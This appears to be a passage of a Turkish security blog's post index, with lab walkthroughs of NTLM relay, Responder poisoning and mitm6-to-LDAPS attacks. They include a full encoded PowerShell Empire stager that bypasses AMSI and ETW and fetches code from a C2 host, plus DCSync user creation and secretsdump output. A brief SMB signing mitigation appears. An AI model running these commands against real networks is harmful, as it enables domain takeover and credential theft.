│├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  ││                  │                    │          │ to be prepended to the launcher     │└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘(Empire: usestager/multi_launcher) &gt; set Listener pwnypwnyINFO: Set Listener to pwnypwny (Empire: usestager/multi_launcher) &gt; executepowershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABFAEEATwBRAEEANgBBAEQAawBBAE8AUQBBADUAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAQwBMAEkATgBNAFYAawB3AHQARAByAEgAUQBNAD0AOQBoADIAKwAzAGcAagBjADYATAB3AEkAZQBPAFkAeQAxADkAVwBWACsAZgBVADAAVgBPAEkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==INFO: Stager copied to clipboard   Oluşturulan encoded veri ntlmrelayxe verilir.1337@empire:~$ ntlmrelayx.py -smb2support -tf relaylist -c \"powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABFAEEATwBRAEEANgBBAEQAawBBAE8AUQBBADUAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAQwBMAEkATgBNAFYAawB3AHQARAByAEgAUQBNAD0AOQBoADIAKwAzAGcAagBjADYATAB3AEkAZQBPAFkAeQAxADkAVwBWACsAZgBVADAAVgBPAEkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\"Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra[*] Protocol Client DCSYNC loaded..[*] Protocol Client RPC loaded..[*] Protocol Client IMAPS loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client LDAPS loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client SMB loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client SMTP loaded..[*] Running in relay mode to hosts in targetfile[*] Setting up SMB Server[*] Setting up HTTP Server on port 80[*] Setting up WCF Server[*] Setting up RAW Server on port 6666[*] Servers started, waiting for connections[*] SMBD-Thread-5 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED[*] SMBD-Thread-6 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.37[*] Authenticating against smb://192.168.1.37 as OFFENSIVE/HELLO SUCCEED[*] SMBD-Thread-6 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED[*] Service RemoteRegistry is in stopped state[*] Service RemoteRegistry is disabled, enabling it[*] Starting service RemoteRegistry[*] SMBD-Thread-8 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left![*] SMBD-Thread-9 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left![*] SMBD-Thread-10 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left![*] Executed specified command on host: 192.168.1.37[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)[*] Stopping service RemoteRegistry[*] Restoring the disabled state for service RemoteRegistry(Empire: usestager/multi_launcher) &gt;[+] New agent Z5HM91KL checked in(Empire: agents) &gt; agents┌Agents────┬───────────┬────────────┬──────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐│ ID       │ Name      │ Language   │ Internal IP  │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener │├──────────┼───────────┼────────────┼──────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤│ Z5HM91KL │ Z5HM91KL* │ powershell │ 192.168.1.37 │ OFFENSIVE\\SYSTEM │ powershell │ 4312 │ 5/0.0 │ 2023-07-11 16:18:37 EDT │ pwnypwny ││          │           │            │              │                  │            │      │       │ (2 seconds ago)         │          │└──────────┴───────────┴────────────┴──────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘(Empire: agents) &gt; interact Z5HM91KL(Empire: Z5HM91KL) &gt; whoamiINFO: Tasked Z5HM91KL to run Task 1 [*] Task 1 results receivedNT AUTHORITY\\SYSTEM(Empire: Z5HM91KL) &gt;Nasıl önlenir?SMB Signing aktif edilir.PS C:\\Windows\\system32&gt; Get-SmbServerConfiguration | select RequireSecuritySignatureRequireSecuritySignature------------------------                   FalsePS C:\\Windows\\system32&gt; set-SmbServerConfiguration -RequireSecuritySignature $TRUE -forcePS C:\\Windows\\system32&gt; Get-SmbServerConfiguration | select RequireSecuritySignatureRequireSecuritySignature------------------------                    Tru     25    Statically Configured DNS Servers:    192.168.1.50    Register with which suffix:           Primary only    Statically Configured WINS Servers:   NonConfiguration for interface \"Loopback Pseudo-Interface 1\"    DHCP enabled:                         No    IP Address:                           127.0.0.1    Subnet Prefix:                        127.0.0.0/8 (mask 255.0.0.0)    InterfaceMetric:                      75    Statically Configured DNS Servers:    None    Register with which suffix:           Primary only    Statically Configured WINS Servers:   None  Kontrol edelim1337@empire:~$ crackmapexec smb 192.168.1.27                     SMB         192.168.1.27    445    CLIENT2          [*] Windows 10.0 Build 22621 x64 (name:CLIENT2) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False)1337@empire:~$ responder -I eth0 -dwvF                                         __  .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0  To support this project:  Patreon -&gt; https://www.patreon.com/PythonResponder  Paypal  -&gt; https://paypal.me/PythonResponder  Author: Laurent Gaffie (laurent.gaffie@gmail.com)  To kill this script hit CTRL-C[+] Poisoners:    LLMNR                      [ON]    NBT-NS                     [ON]    MDNS                       [ON]    DNS                        [ON]    DHCP                       [ON][+] Servers:    HTTP server                [OFF]    HTTPS server               [ON]    WPAD proxy                 [ON]    Auth proxy                 [OFF]    SMB server                 [OFF]    Kerberos server            [ON]    SQL server                 [ON]    FTP server                 [ON]    IMAP server                [ON]    POP3 server                [ON]    SMTP server                [ON]    DNS server                 [ON]    LDAP server                [ON]    RDP server                 [ON]    DCE-RPC server             [ON]    WinRM server               [ON][+] HTTP Options:    Always serving EXE         [OFF]    Serving EXE                [OFF]    Serving HTML               [OFF]    Upstream Proxy             [OFF][+] Poisoning Options:    Analyze Mode               [OFF]    Force WPAD auth            [ON]    Force Basic Auth           [OFF]    Force LM downgrade         [OFF]    Force ESS downgrade        [OFF][+] Generic Options:    Responder NIC              [eth0]    Responder IP               [192.168.1.40]    Responder IPv6             [fe80::5acb:1933:215e:479f]    Challenge set              [random]    Don't Respond To Names     ['ISATAP'][+] Current Session Variables:    Responder Machine Name     [WIN-P5M72F80AIX]    Responder Domain Name      [Q1G6.LOCAL]    Responder DCE-RPC Port     [46965][+] Listening for events...                                                                                                                                                                                                                 [*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Domain Master Browser)[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Domain Master Browser)[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Domain Master Browser)[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Browser Election)[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri1337@empire:~$ ntlmrelayx.py -t smb://192.168.1.27 -smb2support                              Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra[*] Protocol Client DCSYNC loaded..[*] Protocol Client RPC loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client IMAPS loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client LDAPS loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client SMB loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client SMTP loaded..[*] Running in relay mode to single host[*] Setting up SMB Server[*] Setting up HTTP Server on port 80[*] Setting up WCF Server[*] Setting up RAW Server on port 6666[*] Servers started, waiting for connections[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.1.27, attacking target smb://192.168.1.27[-] Signing is required, attack won't work unless using -remove-target / --remove-mic"
  },
  
  {
    "title": "mitm6 & ntlmrelay",
    "url": "/posts/mitm6-ve-ntlmrelay/",
    "categories": "internal, ADSecurity, attacks, mitigate",
    "tags": "ntlmrelay, relay-based, non-user, mitm6, ipv6, DNS, wpad",
    "date": "2023-07-10 00:00:00 +0300",
    





    
    "snippet": "OFFENSIVE yerel ağda istemci tarafından aratıldığı zaman, istemciler IPv4 ve IPv6 üzerinden arama gerçekleştirilir. IPv6 üzerinden bizim spoof ettiğimiz OFFENSIVE.LOCAL adresi kurbanlar tarafından ...",
    "content": "OFFENSIVE yerel ağda istemci tarafından aratıldığı zaman, istemciler IPv4 ve IPv6 üzerinden arama gerçekleştirilir. IPv6 üzerinden bizim spoof ettiğimiz OFFENSIVE.LOCAL adresi kurbanlar tarafından işlenir. Çünkü yerel ağda istemciler DNS ayarlarını otomatikte bırakmıştır1337@empire:~$ sudo mitm6 -d offensive[sudo] password for 1337: Starting mitm6 using the following configuration:Primary adapter: eth0 [08:00:27:53:0c:ba]IPv4 address: 192.168.1.19IPv6 address: fe80::5acb:1933:215e:479fDNS local search domain: offensiveDNS allowlist: offensiveSent spoofed reply for wpad.OFFENSIVE.LOCAL. to fe80::192:168:1:51Sent spoofed reply for wpad.offensive. to fe80::192:168:1:51Sent spoofed reply for wpad.OFFENSIVE.LOCAL. to fe80::192:168:1:51Sent spoofed reply for wpad.offensive.local. to fe80::192:168:1:51  wpad, Browserlar tarafından kullanılan proxy agent olarak bilinir. Amacı, proxy yapılandırma dosyalarının nerede olduğunu tespit etmek için kullanılır ve buna PAC adı verilir. Saldırı mekaniği zaten domain adını IPv6 üzerinden spooflayıp, istemcilerin wpad üzerinden bize bağlanmasını sağlamak. Bağlandıkları zaman zararlı PAC dosyasını istemcilere yollayıp LDAP üzerine relay yapabilmek ve domain üzerinde computer account veya user account açmak. Ancak PAC dosyası yollama işi düşük yetkili kullanıcılar için, bu bölümde yüksek yetkili bir hesap networkte gezerken uygulanacak kısma bakıyoruz. Çünkü biliyoruz ki yüksek yetkili userların domain üzerinde direkt user açma ve delegate yetkisi var.C:\\Users\\dumbuser.OFFENSIVE&gt;ipconfigWindows IP ConfigurationEthernet adapter Ethernet:   Connection-specific DNS Suffix  . : offensive   Link-local IPv6 Address . . . . . : fe80::192:168:1:51%13   Link-local IPv6 Address . . . . . : fe80::8605:95a8:42f0:934f%13   IPv4 Address. . . . . . . . . . . : 192.168.1.51   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.1.50  Bu noktada, client sistemde başka adaptör yoksa, yukarıda belirtildiği gibi yok ancak bazı caselerde olabilir. Clientın internet erişimi kesilir.  OFFENSIVE adının localde çözülebilmesi için hosts dosyasına IP adresi girilir.1337@empire:~$ echo '192.168.1.50 OFFENSIVE' &gt;&gt; /etc/hosts  Relay yapıp, user account veya computer account açabilmek için LDAPS gerekmekte. Default olarak LDAPS=636 portunu bind eder. Default değil ise LDAPS servisinin hangi portu bind ettiğini öğrenmek gerekir.1337@empire:~$ nmap -p636 offensive.local --reasonStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 06:38 EDTNmap scan report for offensive.local (192.168.1.50)Host is up, received syn-ack (0.0045s latency).rDNS record for 192.168.1.50: OFFENSIVEPORT    STATE SERVICE REASON636/tcp open  ldapssl syn-ackNmap done: 1 IP address (1 host up) scanned in 0.03 seconds  Default portta çalıştığı için ldaps://offensive.local:9999 gibi portu belirtmeye gerek yok.1337@empire:~$ ntlmrelayx.py -t ldaps://offensive.local --delegate-access --no-dump --no-smb-serverImpacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra[*] Protocol Client DCSYNC loaded..[*] Protocol Client RPC loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client IMAPS loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client LDAPS loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client SMB loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client SMTP loaded..[*] Running in relay mode to single host[*] Setting up HTTP Server on port 80[*] Setting up WCF Server[*] Setting up RAW Server on port 6666[*] Servers started, waiting for connections[*] HTTPD(80): Client requested path: /[*] HTTPD(80): Client requested path: /[*] HTTPD(80): Connection from 192.168.1.51 controlled, attacking target ldaps://offensive.local[*] HTTPD(80): Client requested path: /[*] HTTPD(80): Authenticating against ldaps://offensive.local as OFFENSIVE/DUMBUSER SUCCEED[*] Enumerating relayed user's privileges. This may take a while on large domains[*] User privileges found: Create user[*] User privileges found: Adding user to a privileged group (Enterprise Admins)[*] User privileges found: Modifying domain ACL[*] Attempting to create user in: CN=Users,DC=OFFENSIVE,DC=LOCAL[*] Adding new user with username: OqTlMMpPRn and password: BANYv(PCQGXf-qn result: OK[*] Querying domain security descriptor[*] Success! User OqTlMMpPRn now has Replication-Get-Changes-All privileges on the domain[*] Try using DCSync with secretsdump.py and this user :)[*] Saved restore state to aclpwn-20230711-063721.restore[-] New user already added. Refusing to add another[-] Unable to escalate without a valid user, aborting.Yetkili bir kullanıcı olduğu taktirde yukarıdaki gibi bir çıktı gelir. Yani LDAPS üzerinden direkt olarak Domain User açmayı dener çünkü yetkili kullanıcının buna yetkisi vardır  Bu aşamadan itibaren mitm6 durdurulabilir.1337@empire:~$ secretsdump.py OqTlMMpPRn@offensive.localImpacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 FortraPassword:[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT 